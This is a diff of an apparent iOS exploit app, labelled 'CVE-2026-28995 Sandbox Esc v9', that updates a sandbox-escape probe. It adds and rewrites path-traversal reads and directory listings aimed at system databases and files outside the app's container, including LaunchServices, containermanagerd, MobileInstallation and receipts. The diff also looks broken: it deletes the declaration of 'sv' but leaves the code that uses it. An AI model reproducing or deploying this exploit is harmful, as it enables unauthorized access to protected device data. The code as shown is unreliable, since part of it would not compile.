@@ -662,7 +662,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v8" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v9" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7254,7 +7254,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     // ============================================================
-    // v8: Revert to v6 structure (known compiling), add v7 probe targets
+    // v9: Enumerate lsd dir, wider filename guesses, new /var/db paths
     // ============================================================
 
     #define BASE @"../../../../../../../../../../../../../"
@@ -7298,7 +7298,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
     [log appendFormat:@"  dataUUID: %@\n  bundleUUID: %@\n  appName: %@\n", dataUUID, bundleUUID, appName];
 
-    // Test 3: Verify sandbox escape to own containers (with correct appName)
+    // Test 3: Verify access to own containers
     [log appendString:@"\n--- Test 3: Verify access to own containers ---\n"];
     NSString *ownMeta = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", dataUUID];
@@ -7307,32 +7307,43 @@ static void *iohid_threadCopyEvent(void *arg) {
         @"var/containers/Bundle/Application/%@/%@/Info.plist", bundleUUID, appName];
     probeFile(ownInfo, log);
 
-    // Test 4: lsd DB probe (LaunchServices = bundleID->path mappings)
-    [log appendString:@"\n--- Test 4: lsd DB ---\n"];
+    // Test 4: lsd DB — wider guesses + enumeration
+    [log appendString:@"\n--- Test 4: lsd DB (LaunchServices) ---\n"];
     probeFile(@"var/db/lsd/lsd.db", log);
+    probeFile(@"var/db/lsd/lsd.sqlite3", log);
+    probeFile(@"var/db/lsd/lsd.sqlite", log);
     probeFile(@"var/db/lsd/csstore", log);
-    probeFile(@"var/db/lsd/trustCache.sqlite3", log);
-    probeFile(@"var/db/lsd/Cache.db", log);
-    probeFile(@"var/db/lsd/db.sqlite", log);
-    probeFile(@"var/db/lsd/com.apple.lsd.plist", log);
+    probeFile(@"var/db/lsd/store.sqlite3", log);
+    probeFile(@"var/db/lsd/db.sqlite3", log);
+    probeFile(@"var/db/lsd/database.sqlite3", log);
+    // Try enumeration on lsd dir
+    NSString *lsdDir = TRYFILE(@"var/db/lsd");
+    NSArray *lsdC = [fm contentsOfDirectoryAtPath:lsdDir error:nil];
+    NSArray *lsdS = [fm subpathsOfDirectoryAtPath:lsdDir error:nil];
+    [log appendFormat:@"  contentsOfDir: %lu, subpaths: %lu\n",
+        (unsigned long)lsdC.count, (unsigned long)lsdS.count];
 
-    // Test 5: appstored cache + enumeration
-    [log appendString:@"\n--- Test 5: appstored cache ---\n"];
-    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/Cache.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/store.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/appstored.sqlite", log);
+    // Test 5: Other /var/db/ paths
+    [log appendString:@"\n--- Test 5: /var/db/ other paths ---\n"];
+    probeFile(@"var/db/receipts/", log);
+    probeFile(@"var/db/containermanagerd/", log);
+    probeFile(@"var/db/MobileInstallation/", log);
 
-    // Test 6: /var/mobile/Applications legacy path + enumeration
-    [log appendString:@"\n--- Test 6: /var/mobile/Applications/ ---\n"];
-    NSString *appsDir = TRYFILE(@"var/mobile/Applications");
-    NSArray *appsItems = [fm contentsOfDirectoryAtPath:appsDir error:nil];
-    [log appendFormat:@"  contentsOfDirectory: %lu items\n", (unsigned long)appsItems.count];
+    // Test 6: containermanagerd alternative DB names
+    [log appendString:@"\n--- Test 6: containermanagerd alt names ---\n"];
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/Cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/containers.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/db.sqlite", log);
 
-    // Test 7: SystemVersion.plist read verification
-    [log appendString:@"\n--- Test 7: SystemVersion.plist ---\n"];
+    // Test 7: SystemVersion.plist + enumerate containermanagerd
+    [log appendString:@"\n--- Test 7: containermanagerd enum + SystemVersion ---\n"];
+    NSString *cmDir = TRYFILE(@"var/mobile/Library/Caches/com.apple.containermanagerd");
+    NSArray *cmC = [fm contentsOfDirectoryAtPath:cmDir error:nil];
+    NSArray *cmS = [fm subpathsOfDirectoryAtPath:cmDir error:nil];
+    [log appendFormat:@"  containermanagerd: contents=%lu subpaths=%lu\n",
+        (unsigned long)cmC.count, (unsigned long)cmS.count];
     probeFile(@"System/Library/CoreServices/SystemVersion.plist", log);
-    NSString *svPath = TRYFILE(@"System/Library/CoreServices/SystemVersion.plist");
-    NSDictionary *sv = [NSDictionary dictionaryWithContentsOfFile:svPath];
     if (sv) {
         [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
